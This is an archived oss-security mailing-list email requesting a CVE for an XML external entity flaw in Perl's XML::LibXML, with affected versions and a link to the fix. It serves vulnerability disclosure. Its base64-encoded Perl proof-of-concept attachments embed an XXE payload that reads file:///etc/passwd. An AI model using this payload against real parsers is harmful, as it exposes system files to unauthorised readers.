X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4970" "Friday" "24" "April" "2015" "20:40:37" "+0000" "Tilmann Haak" "tilmann.haak@xing.com" "<8BB9CA6B6B0D854E91889283C9B54C75DAF38EAB@xing-exchsvr04.xing.hh>" "116" "[oss-security] CVE request: Perl XML::LibXML" nil nil nil "4" "2015042420:40:37" "[oss-security] CVE request: Perl XML::LibXML" (number mark "        tilmann.haak Apr 24  116/4970  " thread-indent "\"[oss-security] CVE request: Perl XML::LibXML\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 15959 invoked by uid 550); 25 Apr 2015 01:32:00 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 21987 invoked from network); 24 Apr 2015 20:40:50 -0000
DKIM-Signature: v=1; a=rsa-sha256; d=xing.com; s=main; c=relaxed/simple;
	q=dns/txt; i=@xing.com; t=1429908039;
	h=From:Subject:Date:To:MIME-Version:Content-Type;
	bh=bD94L854Ztg+0g/RMSypkaJ0COvqhzwKLiTbL3x8WW8=;
	b=cxxMPqPeOtcSw3c1aMZfPdLmI6HDGCIYIr0lqwTW9d52nPiM21A/yOrqjDQrDAhe
	fkFvt3pNMVvG/EHLmQfdjCE49Dvh5d95Vpeml1cy9SEqhC2Ur2K0vg4cOJ4MHcnb
	PY8EPbEyLZfZD5T7r6divny5X7vI6THeGpQeWsnjgJc=;
X-MSFBL: b3NzLXNlY3VyaXR5QGxpc3RzLm9wZW53YWxsLmNvbUBtYWlsb3V0Mi0xMjBAbWFp
	bG91dDIteGluZy11bmNlcnRpZmllZEA=
Thread-Topic: CVE request: Perl XML::LibXML
Thread-Index: AdB+zsQh7bwrWWQ+Tr+8++wgagm0Bw==
Message-ID: <8BB9CA6B6B0D854E91889283C9B54C75DAF38EAB@xing-exchsvr04.xing.hh>
Accept-Language: de-DE, en-US
Content-Language: de-DE
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator:
x-originating-ip: [82.112.107.70]
Content-Type: multipart/mixed;
	boundary="_003_8BB9CA6B6B0D854E91889283C9B54C75DAF38EABxingexchsvr04xi_"
MIME-Version: 1.0
Date: Fri, 24 Apr 2015 20:40:37 +0000
From: Tilmann Haak <tilmann.haak@xing.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE request: Perl XML::LibXML
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>

--_003_8BB9CA6B6B0D854E91889283C9B54C75DAF38EABxingexchsvr04xi_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

Hi oss-sec,

I'd like to request a CVE number for an XEE vulnerability in Perl's XML::Li=
bXML.

According to XML::LibXML's documentation it should be possible to
disable processing of external entities by using the "expand_entities" para=
meter.

Two example scripts are attached to this mail. The=20
output of XEE-XML-LibXML-demo.pl should not contain external=20
entities, but "expand_entities" is ignored. The output=20
of XEE-XML-LibXML-demo2.pl is as expected (no external entities).

The behaviour depends on how the XML is loaded.
Using "$XML_DOC =3D XML::LibXML->load_xml" works as documented, using=20
$parser =3D XML::LibXML->new and $XML_DOC =3D $parser->load_xml does not.

I've tested the issue on two platforms and was able to print out the=20
system's "/etc/passwd" file.


Ubuntu 12.04.5 LTS
Perl version: v5.14.2
libxml2 version: 2.7.8
XML::LibXML version: 1.89

Mac OS X 10.9.5
Perl version: v5.16.2
libxml2 version: 2.9.0
XML::LibXML version: 2.0118


The vulnerability is fixed in version 2.0119.
I'm not sure which older versions are affected, however the vulnerability i=
s present in version 1.89 and probably older versions, too.

The fix:
<https://bitbucket.org/shlomif/perl-xml-libxml/commits/5962fd067580767777e9=
4640b129ae8930a68a30>

Changelog:
<http://cpansearch.perl.org/src/SHLOMIF/XML-LibXML-2.0119/Changes>

I'm not aware of other CVE requests.


Thanks in advance,
  Tilmann Haak

--_003_8BB9CA6B6B0D854E91889283C9B54C75DAF38EABxingexchsvr04xi_
Content-Type: application/octet-stream; name="XEE-XML-LibXML-demo.pl"
Content-Description: XEE-XML-LibXML-demo.pl
Content-Disposition: attachment; filename="XEE-XML-LibXML-demo.pl"; size=948;
	creation-date="Fri, 24 Apr 2015 20:39:31 GMT";
	modification-date="Fri, 24 Apr 2015 20:39:31 GMT"
Content-Transfer-Encoding: base64

IyEvdXNyL2Jpbi9wZXJsCnVzZSBzdHJpY3Q7CnVzZSB3YXJuaW5nczsKdXNl
IFhNTDo6TGliWE1MOwoKbXkgJFhNTCA9IDw8IkVPVCI7Cjw/eG1sIHZlcnNp
b249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+CjwhRE9DVFlQRSB0aXRsZSBb
IDwhRUxFTUVOVCB0aXRsZSBBTlkgPgo8IUVOVElUWSB4eGUgU1lTVEVNICJm
aWxlOi8vL2V0Yy9wYXNzd2QiID5dPgo8cnNzIHZlcnNpb249IjIuMCIgeG1s
bnM6YXRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwNS9BdG9tIj4KPGNoYW5u
ZWw+CiAgICA8dGl0bGU+WFhFPC90aXRsZT4KICAgIDxsaW5rPmV4YW1wbGUu
Y29tPC9saW5rPgogICAgPGRlc2NyaXB0aW9uPlhYRTwvZGVzY3JpcHRpb24+
CiAgICA8aXRlbT4KICAgICAgICA8dGl0bGU+Jnh4ZTs8L3RpdGxlPgogICAg
ICAgIDxsaW5rPmV4YW1wbGUuY29tPC9saW5rPgogICAgICAgIDxkZXNjcmlw
dGlvbj5YWEUgaGVyZTwvZGVzY3JpcHRpb24+CiAgICA8L2l0ZW0+CjwvY2hh
bm5lbD4KPC9yc3M+CkVPVAoKbXkgJHBhcnNlciA9IFhNTDo6TGliWE1MLT5u
ZXcoCiAgICBleHBhbmRfZW50aXRpZXMgPT4gMCwKICAgIGxvYWRfZXh0X2R0
ZCAgICA9PiAwLAogICAgbm9fbmV0d29yayAgICAgID0+IDEsCiAgICBleHBh
bmRfeGluY2x1ZGUgPT4gMCwKKTsKbXkgJFhNTF9ET0MgPSAkcGFyc2VyLT5s
b2FkX3htbCggc3RyaW5nID0+ICRYTUwsICk7CgpwcmludCAiKioqXG4iOwpw
cmludCAiUGVybCB2ZXJzaW9uOiAiIC4gJF5WIC4gIlxuIjsKcHJpbnQgImxp
YnhtbDIgdmVyc2lvbjogIiAuIFhNTDo6TGliWE1MOjpMSUJYTUxfRE9UVEVE
X1ZFUlNJT04gLiAiXG4iOwpwcmludCAiWE1MOjpMaWJYTUwgdmVyc2lvbjog
IiAuICRYTUw6OkxpYlhNTDo6VkVSU0lPTiAuICJcbiI7CnByaW50ICIqKipc
biI7CnByaW50ICRYTUxfRE9DLT50b1N0cmluZygpOwpwcmludCAiKioqXG4i
OwoK

--_003_8BB9CA6B6B0D854E91889283C9B54C75DAF38EABxingexchsvr04xi_
Content-Type: application/octet-stream; name="XEE-XML-LibXML-demo2.pl"
Content-Description: XEE-XML-LibXML-demo2.pl
Content-Disposition: attachment; filename="XEE-XML-LibXML-demo2.pl"; size=930;
	creation-date="Fri, 24 Apr 2015 20:39:31 GMT";
	modification-date="Fri, 24 Apr 2015 20:39:31 GMT"
Content-Transfer-Encoding: base64

IyEvdXNyL2Jpbi9wZXJsCnVzZSBzdHJpY3Q7CnVzZSB3YXJuaW5nczsKdXNl
IFhNTDo6TGliWE1MOwoKbXkgJFhNTCA9IDw8IkVPVCI7Cjw/eG1sIHZlcnNp
b249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+CjwhRE9DVFlQRSB0aXRsZSBb
IDwhRUxFTUVOVCB0aXRsZSBBTlkgPgo8IUVOVElUWSB4eGUgU1lTVEVNICJm
aWxlOi8vL2V0Yy9wYXNzd2QiID5dPgo8cnNzIHZlcnNpb249IjIuMCIgeG1s
bnM6YXRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwNS9BdG9tIj4KPGNoYW5u
ZWw+CiAgICA8dGl0bGU+WFhFPC90aXRsZT4KICAgIDxsaW5rPmV4YW1wbGUu
Y29tPC9saW5rPgogICAgPGRlc2NyaXB0aW9uPlhYRTwvZGVzY3JpcHRpb24+
CiAgICA8aXRlbT4KICAgICAgICA8dGl0bGU+Jnh4ZTs8L3RpdGxlPgogICAg
ICAgIDxsaW5rPmV4YW1wbGUuY29tPC9saW5rPgogICAgICAgIDxkZXNjcmlw
dGlvbj5YWEUgaGVyZTwvZGVzY3JpcHRpb24+CiAgICA8L2l0ZW0+CjwvY2hh
bm5lbD4KPC9yc3M+CkVPVAoKbXkgJFhNTF9ET0MgPSBYTUw6OkxpYlhNTC0+
bG9hZF94bWwoCiAgICBzdHJpbmcgICAgICAgICAgPT4gJFhNTCwKICAgIGV4
cGFuZF9lbnRpdGllcyA9PiAwLAogICAgbG9hZF9leHRfZHRkICAgID0+IDAs
CiAgICBub19uZXR3b3JrICAgICAgPT4gMSwKICAgIGV4cGFuZF94aW5jbHVk
ZSA9PiAwLAopOwoKcHJpbnQgIioqKlxuIjsKcHJpbnQgIlBlcmwgdmVyc2lv
bjogIiAuICReViAuICJcbiI7CnByaW50ICJsaWJ4bWwyIHZlcnNpb246ICIg
LiBYTUw6OkxpYlhNTDo6TElCWE1MX0RPVFRFRF9WRVJTSU9OIC4gIlxuIjsK
cHJpbnQgIlhNTDo6TGliWE1MIHZlcnNpb246ICIgLiAkWE1MOjpMaWJYTUw6
OlZFUlNJT04gLiAiXG4iOwpwcmludCAiKioqXG4iOwpwcmludCAkWE1MX0RP
Qy0+dG9TdHJpbmcoKTsKcHJpbnQgIioqKlxuIjsK

--_003_8BB9CA6B6B0D854E91889283C9B54C75DAF38EABxingexchsvr04xi_--
